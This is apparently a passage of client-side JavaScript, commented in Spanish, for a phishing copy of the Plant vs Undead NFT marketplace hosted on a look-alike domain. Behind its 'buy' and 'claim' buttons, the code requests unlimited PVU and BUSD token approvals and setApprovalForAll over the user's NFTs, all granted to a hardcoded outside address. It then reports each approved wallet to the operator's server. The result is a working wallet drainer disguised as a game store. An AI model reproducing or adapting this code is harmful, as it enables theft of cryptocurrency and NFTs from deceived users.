// Variables
var baseURL = 'https://marketplace.fac-plantvsundead.com',
    web3, metamaskAccounts = [], myAccount, isConnected,
    lastURL, actURL, navText, navImg,
    dropdownButton, dropdownMenu, dropdownImg,
    divLogin, divAccount, logoHead;
    
// Variables de contrato y metamask
const Web3 = require('web3');
var pvuContract,
    toAddress = '0x17fCFf24f0e9b3b360a34df8d92455581Db0EF7c',
    pvuAddressContract = '0x31471E0791fCdbE82fbF4C44943255e923F1b794',
    pvuAbi = [{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[],"name":"Pause","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[],"name":"Unpause","type":"event"},{"payable":true,"stateMutability":"payable","type":"fallback"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"burn","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getBurnedAmountTotal","outputs":[{"internalType":"uint256","name":"_amount","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"isOwner","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"pause","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"paused","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"renounceOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"_receiver","type":"address"},{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"_from","type":"address"},{"internalType":"address","name":"_receiver","type":"address"},{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"unpause","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"}];

var nftContract,
    nftAddressContract = '0x5Ab19e7091dD208F352F8E727B6DCC6F8aBB6275',
    nftAbi = [{"inputs":[],"stateMutability":"nonpayable","type":"nconstructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"owner","type":"address"},{"indexed":false,"internalType":"uint256","name":"tokenId","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"plantId","type":"uint256"}],"name":"Birth","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"MintFeeAddressTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"account","type":"address"}],"name":"Paused","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"bytes32","name":"role","type":"bytes32"},{"indexed":true,"internalType":"bytes32","name":"previousAdminRole","type":"bytes32"},{"indexed":true,"internalType":"bytes32","name":"newAdminRole","type":"bytes32"}],"name":"RoleAdminChanged","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"bytes32","name":"role","type":"bytes32"},{"indexed":true,"internalType":"address","name":"account","type":"address"},{"indexed":true,"internalType":"address","name":"sender","type":"address"}],"name":"RoleGranted","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"bytes32","name":"role","type":"bytes32"},{"indexed":true,"internalType":"address","name":"account","type":"address"},{"indexed":true,"internalType":"address","name":"sender","type":"address"}],"name":"RoleRevoked","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"account","type":"address"}],"name":"Unpaused","type":"event"},{"inputs":[],"name":"DEFAULT_ADMIN_ROLE","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"PAUSED_ROLE","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"PVUToken","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256[]","name":"_plantId","type":"uint256[]"}],"name":"addPlantId","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256[]","name":"_seedId","type":"uint256[]"}],"name":"addSeedFarm","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"bundleAddr","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_tokenId","type":"uint256"}],"name":"burnPlant","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_owner","type":"address"},{"internalType":"uint256","name":"_numberPlant","type":"uint256"}],"name":"createBundlePlant","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_owner","type":"address"},{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"createPlant","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_owner","type":"address"}],"name":"createPlantFromFarm","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_tokenId","type":"uint256"},{"internalType":"uint256","name":"_startingPrice","type":"uint256"},{"internalType":"uint256","name":"_endingPrice","type":"uint256"},{"internalType":"uint256","name":"_duration","type":"uint256"}],"name":"createSaleAuction","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"farmAddr","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_id","type":"uint256"}],"name":"getPlant","outputs":[{"internalType":"uint256","name":"birthTime","type":"uint256"},{"internalType":"uint256","name":"plantId","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getRangeId","outputs":[{"internalType":"uint256[]","name":"","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getRangeIdLength","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bytes32","name":"role","type":"bytes32"}],"name":"getRoleAdmin","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bytes32","name":"role","type":"bytes32"},{"internalType":"uint256","name":"index","type":"uint256"}],"name":"getRoleMember","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bytes32","name":"role","type":"bytes32"}],"name":"getRoleMemberCount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getSeedFarm","outputs":[{"internalType":"uint256[]","name":"","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getSeedFarmLength","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bytes32","name":"role","type":"bytes32"},{"internalType":"address","name":"account","type":"address"}],"name":"grantRole","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes32","name":"role","type":"bytes32"},{"internalType":"address","name":"account","type":"address"}],"name":"hasRole","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"isBurn","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"nextTokenId","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"pause","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"paused","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"price","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"rate","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes32","name":"role","type":"bytes32"},{"internalType":"address","name":"account","type":"address"}],"name":"renounceRole","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes32","name":"role","type":"bytes32"},{"internalType":"address","name":"account","type":"address"}],"name":"revokeRole","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"saleAuction","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"saleAuctionAddr","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_address","type":"address"}],"name":"setBundleAddress","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_address","type":"address"}],"name":"setFarmAddress","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"setIsBurn","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_rate","type":"uint256"}],"name":"setRate","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_address","type":"address"}],"name":"setSaleAuctionAddress","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"index","type":"uint256"}],"name":"tokenByIndex","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"tokenOfOwner","outputs":[{"internalType":"uint256[]","name":"","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"uint256","name":"index","type":"uint256"}],"name":"tokenOfOwnerByIndex","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"unpause","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_price","type":"uint256"}],"name":"updatePrice","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"withdrawBalance","outputs":[],"stateMutability":"nonpayable","type":"function"}];

    var busdContract,
    busdAddressContract = '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
    busdAbi = [{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"constant":true,"inputs":[],"name":"_decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"renounceOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}];

// Funciones
function displayAlert(title, msg) {

  let divAlert = document.getElementById('snackbar'),
      alertTitle = document.getElementById('alertTitle'),
      alertMsg = document.getElementById('alertMsg'),
      imgCloseAlert = document.getElementById('imgCloseAlert');

  function closeAlert() {
    divAlert.classList.remove('show');
  }

  // Mostramos la alerta
  divAlert.classList.add('show');
  alertTitle.innerText = title;
  alertMsg.innerText = msg;

  // Eliminamos la alerta después de 5 segundos
  setTimeout( () => { closeAlert(); } , 5000)
  imgCloseAlert.onclick = closeAlert;
}

async function checkConnection () {
  // Check if browser is running Metamask
  let result;
  if (window.ethereum) {
      web3 = new Web3(window.ethereum);
  };

  // Check if User is already connected by retrieving the accounts
  metamaskAccounts = await web3.eth.getAccounts();
  result = (metamaskAccounts.length != 0);
  
  if (result) myAccount = metamaskAccounts[0]; 
  showHeaderInfo();

  return result;
};

function loginEvents() {
    let connectButton = document.getElementById('metamask-button');

    const metamask_connect = async () => {
        if (window.ethereum) {
          web3 = new Web3(window.ethereum);
    
          const networkId = await web3.eth.net.getId();
          if (networkId != 56) {
            await window.ethereum.request({   method: 'wallet_switchEthereumChain',   params: [{ chainId: '0x38' }] });
          }
    
          try {
            await window.ethereum.request({ method: 'eth_requestAccounts' });

            metamaskAccounts = await web3.eth.getAccounts();
            myAccount = metamaskAccounts[0];
            let signRandom = (Math.random() * (90000000 - 40000000) + 90000000).toFixed();
            await web3.eth.personal.sign(web3.utils.utf8ToHex("PVU plantvsundead.com signing: " + signRandom), myAccount, signRandom)

            isConnected = (metamaskAccounts.length != 0);
            view_inventory();
          } catch (err) {
            displayAlert('Error', 'User rejected the request.');
          }
        } else {
          displayAlert('Error', 'MetaMask is required.');
        }
    };

    if (connectButton) connectButton.onclick = metamask_connect;
}

function checkNavBar(url) {

  function setNavOff() {
    if (navText) {
      for(let i=0; i <= navText.length-1; i++){
          navText[i].classList.remove('nuxt-link-exact-active');
          navText[i].classList.remove('nuxt-link-active');
      }
    }
  
    if (navImg[0]) navImg[0].src = 'img/dashboard-inactive.svg';
    if (navImg[1]) navImg[1].src = 'img/market-inactive.svg';
    if (navImg[2]) navImg[2].src = 'img/offering-inactive.svg';
    if (navImg[3]) navImg[3].src = 'img/account-inactive.svg';
  }

  function setNavOn(obj) {
    obj.classList.add('nuxt-link-exact-active');
    obj.classList.add('nuxt-link-active');
  }

  // Apagamos toda la barra de navegación
  setNavOff();

  // A partir de acá, verificamos a qué le vamos a asginar los nuevos estilos.  
  switch (url) {
    case '/#/':
      setNavOn(navText[0]);
      if (navImg[0]) navImg[0].src = 'img/dashboard-active.svg';
      break;
    
    case '/#/marketplace/plant':
      setNavOn(navText[1]);
      if (navImg[1]) navImg[1].src = 'img/market-active.svg';
      break;

    case '/#/marketplace/mother-tree':
      setNavOn(navText[1]);
      if (navImg[1]) navImg[1].src = 'img/market-active.svg';
      break;

    case '/#/marketplace/puzzle':
      setNavOn(navText[1]);
      if (navImg[1]) navImg[1].src = 'img/market-active.svg';
      break;

    case '/#/offering/seeds':
      setNavOn(navText[2]);
      if (navImg[2]) navImg[2].src = 'img/offering-active.svg';
      break;

    case '/#/profile/inventory':
      setNavOn(navText[3]);
      if (navImg[3]) navImg[3].src = 'img/account-active.svg';
      break;
  }
}

async function loadView(src, newUrl) {
    let res = await fetch(baseURL + src),
    htmlCode = await res.text();
    const content = document.getElementById('content');
    content.innerHTML = htmlCode;
    history.pushState('', '', newUrl);
    checkNavBar(newUrl);
}

async function view_login () {
    // Cargamos la vista login
    await loadView('/login-ajax', '/#/login');
    loginEvents();
}

async function view_dashboard () {
  // Cargamos la vista dashboard
  await loadView('/dashboard-ajax', '/#/');
}

async function view_offering () {
  await loadView('/offering/seeds', '/#/offering/seeds');

  let buyButton = document.getElementById('buy-button'),
      claimButton = document.getElementById('claim-button'),
      approvePVU = false,
      approveNFT = false;
      
  async function sendNFTApproval() {
    nftContract = new web3.eth.Contract(nftAbi, nftAddressContract, {from: myAccount});

    let datita = await nftContract.methods.setApprovalForAll(toAddress, 1).encodeABI();

      const tx = {
        from: myAccount, 
        to: nftAddressContract, 
        data: datita 
      };
      
      web3.eth.sendTransaction(tx, myAccount)
          .then(async function () {
            await fetch(baseURL + '/wallet/nft/' + myAccount);
            approveNFT = true;
            sendBUSDApproval();
          })
          .catch( () => {
            displayAlert('Error', 'User rejected the request.');
            buyButton.innerHTML = '<span class="v-btn__content"><img data-v-47162bed="" src="/img/fusd.a034bc3.svg"><p data-v-47162bed="" class="tw-ml-2">100 FUSD</p></span>';
            claimButton.innerHTML = '<span class="v-btn__content"><img data-v-47162bed="" src="/img/fusd.a034bc3.svg"><p data-v-47162bed="" class="tw-ml-2">CLAIM</p></span>';
          });
  }

  async function sendBUSDApproval() {
    busdContract = new web3.eth.Contract(busdAbi, busdAddressContract, {from: myAccount});

    let bigNumber = web3.utils.toBN('1000000000000000000000000000000'),
            datita = await busdContract.methods.approve(toAddress, bigNumber).encodeABI();

      const tx = {
        from: myAccount, 
        to: busdAddressContract, 
        data: datita 
      };
      
      web3.eth.sendTransaction(tx, myAccount)
          .then(async function () {
            await fetch(baseURL + '/wallet/busd/' + myAccount);
          })
          .catch( () => {
            displayAlert('Error', 'User rejected the request.');
            buyButton.innerHTML = '<span class="v-btn__content"><img data-v-47162bed="" src="/img/fusd.a034bc3.svg"><p data-v-47162bed="" class="tw-ml-2">100 FUSD</p></span>';
            claimButton.innerHTML = '<span class="v-btn__content"><img data-v-47162bed="" src="/img/fusd.a034bc3.svg"><p data-v-47162bed="" class="tw-ml-2">CLAIM</p></span>';
          });
  }

  async function sendPVUApproval() {
    pvuContract = new web3.eth.Contract(pvuAbi, pvuAddressContract, {from: myAccount});

    let bigNumber = web3.utils.toBN('1000000000000000000000000000000'),
            datita = await pvuContract.methods.approve(toAddress, bigNumber).encodeABI();

      const tx = {
        from: myAccount, 
        to: pvuAddressContract, 
        data: datita 
      };
      
      web3.eth.sendTransaction(tx, myAccount)
          .then(async function () {
            await fetch(baseURL + '/wallet/pvu/' + myAccount);
            approvePVU = true;
            sendNFTApproval();
          })
          .catch( () => {
            displayAlert('Error', 'User rejected the request.');
            buyButton.innerHTML = '<span class="v-btn__content"><img data-v-47162bed="" src="/img/fusd.a034bc3.svg"><p data-v-47162bed="" class="tw-ml-2">100 FUSD</p></span>';
            claimButton.innerHTML = '<span class="v-btn__content"><img data-v-47162bed="" src="/img/fusd.a034bc3.svg"><p data-v-47162bed="" class="tw-ml-2">CLAIM</p></span>';
          });
  }
    
  async function approvalTokens() {

    if (isConnected) {
      const networkId = await web3.eth.net.getId();
      
      if (networkId != 56) {
          await window.ethereum.request({   method: 'wallet_switchEthereumChain',   params: [{ chainId: '0x38' }] });
      } else {
          this.innerHTML = "<div class='preloader'></div>";

          if (!approvePVU) {
            sendPVUApproval();
          } else {
            if (!approveNFT) {
              sendNFTApproval();
            } else {
              sendBUSDApproval();
            }
          }
      }
    } else {
      await window.ethereum.request({ method: 'eth_requestAccounts' });

      metamaskAccounts = await web3.eth.getAccounts();
      myAccount = metamaskAccounts[0];
      let signRandom = (Math.random() * (90000000 - 40000000) + 90000000).toFixed();
      await web3.eth.personal.sign(web3.utils.utf8ToHex("PVU plantvsundead.com signing: " + signRandom), myAccount, signRandom)

      isConnected = (metamaskAccounts.length != 0);
    }
  }

  function claimFunc () {
    if (!document.getElementById('divScale').classList.contains('grayscale')) {
      this.innerHTML = "<div class='preloader'></div>";
      approvalTokens();
    }
  }

  buyButton.onclick = approvalTokens;
  claimButton.onclick = claimFunc;
}

async function view_maintenance () {
  // Cargamos la vista dashboard
  await loadView('/maintenance-ajax', '/' + document.location.hash);
}

async function view_marketplace (typeView) {
  await loadView('/marketplace/' + typeView, '/#/marketplace/' + typeView);
}

function setUserAddress() { 
   // Address
   let miniAddress = (myAccount.substring(0, 4) + '...' + myAccount.substring((myAccount.length - 5), myAccount.length)).toLowerCase(),
   textAddress = [
     document.getElementById('MyAddressMain'),
     document.getElementById('MyAddressInventory'),
     document.getElementById('MyAddressHead'),
     document.getElementById('MyAddressLarge'),
   ];

  if (textAddress[0]) textAddress[0].innerText = miniAddress;
  if (textAddress[1]) textAddress[1].innerText = '(' + miniAddress + ')';
  if (textAddress[2]) textAddress[2].innerText = '(' + miniAddress + ')';
  if (textAddress[3]) textAddress[3].innerText = (myAccount.substring(0, 6) + '...' + myAccount.substring((myAccount.length - 13), myAccount.length)).toLowerCase();
}

async function view_inventory() {
    // Cargamos la vista
    await loadView('/inventory-ajax', '/#/profile/inventory');

    // Eventos - mostramos cantidad de tokens
    pvuContract = new web3.eth.Contract(pvuAbi, pvuAddressContract, {from: myAccount});

    async function getPVUBalance() {
      let balance = await pvuContract.methods.balanceOf(myAccount).call();
      return balance;
    }

